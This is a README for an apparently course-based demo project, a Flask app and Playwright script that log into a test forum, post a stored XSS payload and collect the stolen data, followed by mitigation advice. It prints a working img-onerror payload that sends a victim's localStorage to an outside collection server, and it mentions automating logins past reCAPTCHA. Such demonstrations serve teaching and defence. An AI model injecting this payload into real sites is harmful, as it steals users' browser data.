# Cross-Site Scripting (XSS) Attack

This Flask web app demonstrates an automated Cross-Site Scripting (XSS) attack using Playwright to inject a payload into
the forum application, with receive and log the exfiltrated data.

> Live demo hosted at: 🔗 https://elec0138-xss.meeska.me/

![image](https://github.com/user-attachments/assets/1c41c26f-7b17-459a-93f6-c5315ea00db9)

## 🛑 Attack Flow

The attack works as follows:

1. **Automated Login:** The script uses Playwright to automate the login process on the target
   website [https://elec0138-forum.0138019.xyz/](https://elec0138-forum.0138019.xyz/). It fills in the username and
   password fields and clicks the sign-in button. The automation aims to bypass protections reCAPTCHA, allowing
   unattended access.

2. **XSS Payload Injection:** After logging in, the script navigates to the forum section and posts a message containing
   a malicious XSS payload.

3. **Payload Details:** The payload is an `<img>` tag with an invalid `src` attribute and an `onerror` JavaScript
   handler:

   ```html
   <img src="x" onerror="const d={dt:'elec0138-xss',ls:JSON.stringify(localStorage)};new Image().src='https://elec0138-xss.meeska.me/collect?'+new URLSearchParams(d)">
   ```
    * When a victim's browser attempts to load this image, the invalid `src="x"` triggers the `onerror` event.
    * The JavaScript code within `onerror` accesses the victim's `localStorage`, and serializes its contents into a JSON
      string.
    * It then creates a new image request (`new Image().src`) that sends this data as URL parameters to an
      attacker-controlled server: `https://elec0138-fc.meeska.me/collect`

## 🛡️ Mitigation

To intercept XSS attacks, defense should be implemented in layers: data input -> data storage -> data output -> browser
execution.

1. **Input Validation & Output Encoding**
    - Sanitize all user-supplied input on the server before storing or rendering it. Using mature libraries such as
      `DOMPurify`, `Bleach`, `OWASP Java HTML Sanitizer`.
    - Use a proven templating engine or encoding library to HTML-encode any data reflected back into pages.
2. **Content Security Policy (CSP)**
    - Deploy a strict CSP header that forbids inline JavaScript (e.g. `script-src 'self'`) and only allows scripts from
      trusted origins.
    - Consider using `report-only` mode first to monitor violations, then enforce once you've whitelisted all necessary
      resources.
3. **HttpOnly & Secure Cookie Flags**
    - Mark authentication/session cookies with `HttpOnly` so they cannot be accessed via JavaScript.
    - Add the `Secure` flag to ensure cookies are only sent over HTTPS, and `SameSite=strict` or `lax` to limit
      cross-site requests.

## 📁 Project Structure

The project consists of two main parts:

### 1. XSS Attack Automation Tool

An automated script that injects XSS payloads into the target application:

```
app/xss_attack_tool/
├── __init__.py          # Package initialization
└── main.py              # Playwright-based automation script for XSS injection
```

### 2. Flask Web Demo Application

The web application serves as a demonstration platform for the XSS attack and collects exfiltrated data:

```
app/
├── __init__.py          # Flask application initialization
├── config.py            # Configuration settings
├── models.py            # Data models for storing collected information
├── routes.py            # Web routes and endpoints
├── attack_utils.py      # Utility functions for the attack
├── templates/           # HTML templates for the web interface
└── static/              # Static assets (CSS, JS, images)
```

## ⚙️ Installation

1. Create a virtual environment

2. Install dependencies:

   ```bash
   pip install -r requirements.txt
   ```

3. Configure the application by add the environment variables to the `.env` file

4. Run the application:

   ```
   flask run
   ```

## 🐋 Deployment

1. Build the Docker image:
   ```bash
   docker build -t your-image-name .
   ```
2. Run the Docker container:
   ```bash
   docker run -p <host-port>:5000 \
     -e ATTACK_BACKEND_URL=<your_backend_url_for_this_app> \
     -e <VAR_NAME>=<VAR_VALUE> \
     your-image-name
   ```

## 🔐 Environment Variables

| Variable             | Description                                                  | Required |
| -------------------- | ------------------------------------------------------------ | :------: |
| `ATTACK_TARGET_URL`  | URL of the target forum website (default: https://elec0138-forum.0138019.xyz/) |    ❌     |
| `ATTACK_USERNAME`    | Username for logging into the target forum (default: xss_demo) |    ❌     |
| `ATTACK_PASSWORD`    | Password for logging into the target forum (default: xss_demo_password) |    ❌     |
| `ATTACK_BACKEND_URL` | URL where the exfiltrated data will be sent to (typically the deployment address of this app instance + `/collect`, e.g., `https://elec0138-xss.meeska.me/collect`) |    ✅     |

